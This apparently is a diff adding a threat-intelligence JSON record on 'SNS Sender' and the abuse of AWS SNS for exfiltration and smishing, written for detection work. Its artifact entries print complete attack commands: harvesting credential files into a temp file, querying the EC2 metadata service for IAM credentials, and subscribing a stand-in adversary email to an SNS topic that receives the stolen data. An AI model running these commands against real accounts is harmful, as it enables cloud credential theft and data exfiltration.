@@ -1,0 +1,195 @@
+{
+  "malware_family": "SNS Sender",
+  "threat_actor": "Unknown",
+  "platforms": [
+    "linux",
+    "web"
+  ],
+  "summary": "Adversaries abuse AWS Simple Notification Service (SNS) for data exfiltration and phishing/smishing campaigns. For exfiltration, they create an SNS topic, subscribe an external email address, and publish stolen data to it. For phishing, tools like 'SNS Sender' are used to send bulk SMS messages from compromised AWS accounts with production messaging permissions.",
+  "mitre_techniques": [
+    "T1608",
+    "T1567",
+    "T1530",
+    "T1660"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "command_line",
+      "value": "cat /home/ubuntu/.github/credentials /home/ubuntu/project.env > /tmp/stolen_creds.txt",
+      "context": "Collects credentials from common locations and stages them in a temp file.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "aws sns create-topic --name \"whitebox-sns-topic\" --query 'TopicArn' --output text",
+      "context": "Creates the SNS topic used for data exfiltration.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "aws sns subscribe --topic-arn \"$TOPIC_ARN\" --protocol email --notification-endpoint \"adversary@protonmail.com\"",
+      "context": "Subscribes an adversary-controlled email to the SNS topic.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "aws sns publish --topic-arn \"$TOPIC_ARN\" --message \"$BASE64_CONTENT\" --subject \"Encoded Credentials from EC2\"",
+      "context": "Publishes base64-encoded stolen data to the SNS topic.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\"",
+      "context": "Fetches an IMDSv2 token to get temporary credentials.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "curl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+      "context": "Uses an IMDSv2 token to get the IAM role name.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/tmp/stolen_creds.txt",
+      "context": "Staging file for exfiltrated credentials before publishing to SNS.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/home/ubuntu/.github/credentials",
+      "context": "A target file for credential harvesting on the EC2 instance.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/home/ubuntu/project.env",
+      "context": "A target file for credential harvesting on the EC2 instance.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "whitebox-sns-topic",
+      "context": "The name of the SNS topic created for data exfiltration.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Encoded Credentials from EC2",
+      "context": "Subject line of the exfiltration message sent via SNS.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "SNS Sender",
+      "context": "Name of the Python tool used for bulk SMS phishing campaigns.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "protocol=email",
+      "context": "Pattern in CloudTrail logs indicating an email subscription to SNS.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "*phoneNumber*",
+      "context": "Pattern in CloudTrail logs indicating direct SMS publishing via SNS.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "url",
+      "value": "http://169.254.169.254/latest/api/token",
+      "context": "AWS IMDSv2 endpoint to retrieve a session token.",
+      "specificity": "low",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+      "context": "AWS IMDSv2 endpoint to retrieve IAM role information.",
+      "specificity": "low",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "adversary@protonmail.com",
+      "context": "Example adversary email address for SNS subscription.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "http_header",
+      "value": "X-aws-ec2-metadata-token-ttl-seconds: 21600",
+      "context": "HTTP header to request an IMDSv2 token with a specific TTL.",
+      "specificity": "low",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [],
+  "file_types": [
+    "script"
+  ]
+}
